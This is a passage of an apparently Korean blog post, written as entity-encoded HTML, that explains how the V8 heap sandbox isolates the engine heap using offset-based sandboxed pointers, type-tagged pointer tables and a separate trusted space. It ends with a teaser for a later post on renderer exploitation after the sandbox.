&#xAC83;&#xC744; &#xB9C9;&#xB294; &#xB9DE;&#xCDA4;&#xD615; &#xBC29;&#xC5B4;&#xC120;&#xC774; &#xD544;&#xC694;&#xD588;&#xACE0; &#xC774;&#xAC83;&#xC774; <strong>V8 &#xD799; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;</strong>&#xC758; &#xD575;&#xC2EC; &#xBAA9;&#xD45C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC989;, <strong>&#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC784;&#xC758;&#xAC12;(&#xD2B9;&#xD788; &#xD3EC;&#xC778;&#xD130;)&#xC774; &#xC4F0;&#xC774;&#xB354;&#xB77C;&#xB3C4; &#xADF8; &#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC5D4;&#xC9C4;&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC7A5;&#xC545;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC5EC;&#xB290; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC774;&#xB7EC;&#xD55C; &#xBCF4;&#xC548;&#xC774; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xD06C;&#xBA74; &#xC548;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; Heap Sandbox&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC1C;&#xB150;&#xC801; &#xBC29;&#xC2DD;&#xC744; &#xCDE8;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xBA54;&#xBAA8;&#xB9AC; &#xBD84;&#xB9AC;&#xB7;&#xACA9;&#xB9AC;</strong>: &#xC5D4;&#xC9C4;&#xC758; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB7F0;&#xD0C0;&#xC784;&#xC758; &#xB2E4;&#xB978; &#xBA54;&#xBAA8;&#xB9AC;(&#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;, JIT &#xCF54;&#xB4DC; &#xD398;&#xC774;&#xC9C0; &#xB4F1;)&#xC640; &#xB17C;&#xB9AC;&#xC801;&#xB7;&#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xD558;&#xC5EC;, &#xD799; &#xC0C1;&#xC758; &#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC678;&#xBD80; &#xC2E4;&#xD589;&#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD3EC;&#xC778;&#xD130; &#xCEA1;&#xC290;&#xD654; &#xBC0F; &#xAC80;&#xC99D;</strong>: &#xD799;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD3EC;&#xC778;&#xD130; &#xD45C;&#xD604;&#xC744; &#xC778;&#xCF54;&#xB529;(&#xD0DC;&#xAE45;)&#xD558;&#xAC70;&#xB098;, &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC808;&#xCC28;&#xB97C; &#xAC70;&#xCCD0; &#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C;&#xC640; &#xC11E;&#xC774;&#xC9C0; &#xC54A;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC81C;&#xD55C;&#xC801; &#xB514;&#xD37C;&#xB7F0;&#xC2F1;&#xB7;&#xACBD;&#xACC4; &#xAC80;&#xC0AC;</strong>: &#xD799;&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xAC12;&#xC774; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC; &#xC8FC;&#xC18C;&#xC778;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0; &#xC5C4;&#xACA9;&#xD788; &#xAD6C;&#xBD84;&#xD558;&#xACE0;, &#xC784;&#xC758;&#xAC12;&#xC744; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xACE7;&#xBC14;&#xB85C; &#xD574;&#xC11D;&#xB7;&#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC811;&#xADFC;&#xC744; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xCC98;&#xB7FC; V8 &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB514;&#xC790;&#xC778;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; V8 &#xD799; &#xB0B4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC784;&#xC758;&#xB85C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC804;&#xC81C; &#xD558;&#xC5D0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xB370; &#xC911;&#xC810;&#xC744; &#xB461;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-Implementation"><a href="#2-2-Implementation" class="headerlink" title="2.2 Implementation"></a>2.2 Implementation</h2><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC124;&#xACC4;&#xC758; &#xD575;&#xC2EC; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB294; <strong>V8 &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xC758; &#xC8FC;&#xC18C; &#xB514;&#xB808;&#xD37C;&#xB7F0;&#xC2F1;&#xC744; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xD3EC;&#xC778;&#xD130; &#xC5F0;&#xC0B0;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xC624;&#xD504;&#xC14B;&#xB7;&#xC778;&#xB371;&#xC2A4; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;</strong>&#xD558;&#xB3C4;&#xB85D; &#xBC14;&#xAFB8;&#xB294; &#xB370; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xD799; &#xC0C1;&#xC758; &#xC784;&#xC758;&#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC774;&#xB098; &#xC2E4;&#xD589; &#xCF54;&#xB4DC;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xCDE8;&#xAE09;&#xC744; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xC774; &#xC124;&#xACC4;&#xC5D0; &#xB300;&#xD574; high-level &#xB2E8;&#xC5D0;&#xC11C; &#xD45C;&#xD604;&#xD55C; &#xADF8;&#xB9BC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><p>&#xC774; &#xCEE8;&#xC149;&#xC740; &#x201C;&#xC0CC;&#xB4DC;&#xBC31;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; / &#xB0B4;&#xB7;&#xC678;&#xBD80;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; / &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC04;&#x201D;&#xC73C;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xB294;&#xB370; &#xC774;&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="1-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC601;&#xC5ED;-&#xC9C0;&#xC815;-Sandbox-Address-Space"><a href="#1-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC601;&#xC5ED;-&#xC9C0;&#xC815;-Sandbox-Address-Space" class="headerlink" title="1. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; (Sandbox Address Space)"></a>1. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; (Sandbox Address Space)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; V8&#xC774; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC8FC;&#xC694; &#xBA54;&#xBAA8;&#xB9AC;(&#xC5D4;&#xC9C4; &#xD799;, ArrayBuffer&#xC758; backing stores, Wasm &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;)&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <strong>&#xB300;&#xD615; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC544;&#xB2CC; &#xAC00;&#xC0C1; &#xACF5;&#xAC04;&#xC5D0; &#xC218; TB &#xB2E8;&#xC704;&#xB85C; &#xC608;&#xC57D;&#xD574; &#xB450;&#xACE0; &#xADF8; &#xACF5;&#xAC04;&#xC744; &#x2018;&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#x2019;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC8FC;&#xBCC0;&#xC5D0;&#xB294; &#xB109;&#xB109;&#xD55C; &#xAC00;&#xB4DC; &#xC601;&#xC5ED;&#xC744; &#xB450;&#xC5B4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80; &#xBC30;&#xC5F4; &#xC778;&#xB371;&#xC2A4;&#xAC00; &#xACBD;&#xACC4;&#xB97C; &#xB118;&#xC5B4; &#xC678;&#xBD80;&#xB85C; &#xD0C8;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C;&#xB098; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><h3 id="2-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xB0B4;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Sandboxed-Pointers"><a href="#2-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xB0B4;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Sandboxed-Pointers" class="headerlink" title="2. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Sandboxed Pointers)"></a>2. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Sandboxed Pointers)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC758; &#xAC1D;&#xCCB4; &#xCC38;&#xC870;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC0C1;&#xC758; &#xC2E4;&#xC81C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC2DC;&#xC791;&#xC810;&#xC73C;&#xB85C;&#xBD80;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;</strong>&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB978;&#xBC14; SandboxedPointer&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xACE0;&#xC815; &#xD06C;&#xAE30;(e.g., 40bit) &#xC624;&#xD504;&#xC14B;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C;, &#xC624;&#xD504;&#xC14B; &#xAC12; &#xC790;&#xCCB4;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xADF8; &#xAC12;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xB294; &#xD56D;&#xC0C1; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xB85C; &#xD55C;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xB85C;&#xC758; &#xC784;&#xC758; &#xC811;&#xADFC;&#xC744; &#xC6D0;&#xCC9C; &#xBD09;&#xC1C4;&#xD558;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xACE0;, &#xC131;&#xB2A5;&#xC801;&#xC73C;&#xB85C;&#xB3C4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; CPU &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC62C;&#xB824;&#xB450;&#xBA74; &#xC624;&#xD504;&#xC14B;&#x2192;&#xC8FC;&#xC18C; &#xBCC0;&#xD658;&#xC744; x64&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xBA85;&#xB839; 2&#xAC1C;, arm64&#xC5D0;&#xC11C;&#xB294; 1&#xAC1C;&#xB85C; &#xB9E4;&#xC6B0; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC678;&#xBD80;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Pointer-Tables"><a href="#3-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC678;&#xBD80;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Pointer-Tables" class="headerlink" title="3. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Pointer Tables)"></a>3. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Pointer Tables)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC758; &#xAC1D;&#xCCB4;(e.g., DOM &#xB178;&#xB4DC;, &#xC678;&#xBD80; &#xD655;&#xC7A5; &#xAC1D;&#xCCB4; &#xB4F1;)&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC16;&#xC9C0; &#xC54A;&#xACE0; <strong>&#xD3EC;&#xC778;&#xD130; &#xD14C;&#xC774;&#xBE14;(pointer table)</strong>&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC2E4;&#xC81C; &#xD3EC;&#xC778;&#xD130; &#xB300;&#xC2E0; <strong>&#xD14C;&#xC774;&#xBE14; &#xC778;&#xB371;&#xC2A4;</strong>&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC870;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; &#xC5EC;&#xB7EC; &#xCE21;&#xBA74;&#xC5D0;&#xC11C; &#xC548;&#xC804;&#xC131;&#xC744; &#xD5A5;&#xC0C1;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xACF5;&#xAC04;&#xC801; &#xC548;&#xC804;&#xC131;(Spatial safety)&#xC744; &#xC704;&#xD574; &#xD14C;&#xC774;&#xBE14; &#xBC94;&#xC704;&#xB97C; &#xB118;&#xB294; &#xC778;&#xB371;&#xC2A4; &#xC811;&#xADFC;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xACE0;, &#xC2DC;&#xAC04;&#xC801; &#xC548;&#xC804;&#xC131;(Temporal safety)&#xC740; GC&#xAC00; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xB7;&#xD68C;&#xC218;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD655;&#xBCF4;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC01; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xD568;&#xAED8; <strong>&#xD0C0;&#xC785; &#xD0DC;&#xADF8;(type tag)</strong> &#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4;, &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xB54C; &#xAE30;&#xB300;&#xB418;&#xB294; &#xD0C0;&#xC785;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC99D;&#xD568;&#xC73C;&#xB85C;&#xC368; Type Confusion &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image%208.png" alt="image.png"></p><h3 id="4-&#xC2E0;&#xB8B0;&#xB41C;-&#xACF5;&#xAC04;-Trusted-Space"><a href="#4-&#xC2E0;&#xB8B0;&#xB41C;-&#xACF5;&#xAC04;-Trusted-Space" class="headerlink" title="4. &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04; (Trusted Space)"></a>4. &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04; (Trusted Space)</h3><p>&#xC77C;&#xBD80; V8 &#xB0B4;&#xBD80; &#xAC1D;&#xCCB4;(e.g., &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xBC30;&#xC5F4;, Deoptimization &#xB370;&#xC774;&#xD130;)&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xCDA9;&#xBD84;&#xD788; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC70;&#xB098;, &#xC798;&#xBABB; &#xCDE8;&#xAE09;&#xB420; &#xACBD;&#xC6B0; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC6B0;&#xD68C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; <strong>&#xC2E0;&#xB8B0;&#xB41C;(Trusted) &#xD799; &#xC601;&#xC5ED;</strong>&#xC744; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xC774; &#xC601;&#xC5ED;&#xC5D0; &#xBBFC;&#xAC10;&#xD55C; &#xAC1D;&#xCCB4;&#xB97C; &#xBAA8;&#xC544;&#xB193;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACF5;&#xAC04;&#xC740; &#xC790;&#xCCB4;&#xC801;&#xC778; &#xD3EC;&#xC778;&#xD130; &#xC555;&#xCD95; &#xCF00;&#xC774;&#xC9C0;&#xB97C; &#xAC16;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB4E4;&#xC744; &#xC9C1;&#xC811; &#xCC38;&#xC870;&#xD558;&#xC9C0; &#xC54A;&#xACE0; TPT(Trusted Pointer Table) &#xAC19;&#xC740; &#xAC04;&#xC811; &#xCC38;&#xC870; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xB354;&#xB77C;&#xB3C4;, &#xC2E0;&#xB8B0;&#xB41C; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xBB34;&#xB2E8; &#xC811;&#xADFC;&#xB7;&#xC870;&#xC791; &#xAC00;&#xB2A5;&#xC131;&#xC740; &#xB300;&#xD3ED; &#xC904;&#xC5B4;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><h3 id="&#xC694;&#xC57D;"><a href="#&#xC694;&#xC57D;" class="headerlink" title="&#xC694;&#xC57D;"></a>&#xC694;&#xC57D;</h3><p>&#xC694;&#xC57D;&#xD558;&#xBA74;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC124;&#xACC4;&#xB294; (1) &#xD070; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xD799;&#xC744; &#xACA9;&#xB9AC;&#xD558;&#xACE0;, (2) &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC624;&#xD504;&#xC14B; &#xAE30;&#xBC18;&#xC758; &#xC548;&#xC804;&#xD55C; &#xD3EC;&#xC778;&#xD130; &#xD45C;&#xD604;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, (3) &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xB300;&#xC0C1;&#xC740; &#xC778;&#xB371;&#xC2A4; &#xAE30;&#xBC18; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xCC38;&#xC870;&#xD558;&#xACE0;, (4) &#xD2B9;&#xD788; &#xBBFC;&#xAC10;&#xD55C; &#xAC1D;&#xCCB4;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xACA9;&#xB9AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB2E4;&#xCE35;&#xC801; &#xC811;&#xADFC;&#xC740; &#xD799; &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC2E4;&#xD589; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xB370; &#xD6A8;&#xACFC;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%2010.png" alt="image.png"></p><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC774;&#xC804;&#xC5D0;&#xB294; &#xD799; &#xC0C1;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB2E8;&#xC21C;&#xD788; &#xB36E;&#xC5B4;&#xC368;&#xC11C; <code>TypedArray</code>&#xC758; <code>backing_store</code> &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC; &#xC804;&#xBC18;&#xC5D0; &#xAC78;&#xCE5C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/W) &#xB2A5;&#xB825;&#xC744; &#xC989;&#xC2DC; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xC758; &#xB3C4;&#xC785;&#xC73C;&#xB85C; &#xD06C;&#xB86C;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC62C;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xD6A8;&#xACFC;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xC624;&#xBC84;&#xB77C;&#xC774;&#xD2B8; &#xB09C;&#xC774;&#xB3C4;&#xC758; &#xC99D;&#xAC00;&#xC785;&#xB2C8;&#xB2E4;. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC804;&#xD658; &#xC790;&#xCCB4;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xAC70;&#xB098;, &#xB36E;&#xC5B4;&#xC4F4; &#xAC12;&#xC774; &#xC720;&#xD6A8;&#xD55C; &#xC2E4;&#xD589; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xB2E8;&#xC77C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xB358; Renderer Process RCE &#xB294; Sandbox Escape &#xB77C;&#xB294; &#xACFC;&#xC815;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xC62C;&#xB77C;&#xAC14;&#xC744; &#xBFD0; Sandbox&#xB9CC; &#xD0C8;&#xCD9C;&#xD558;&#xBA74;&#x2026;?</p><p><img src="image%2011.jpg" alt="image.jpg"></p><p>&#xB2E4;&#xC74C; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC0DD;&#xAE34; &#xD6C4;&#xC758; &#xB80C;&#xB354;&#xB7EC; RCE&#xAC00; 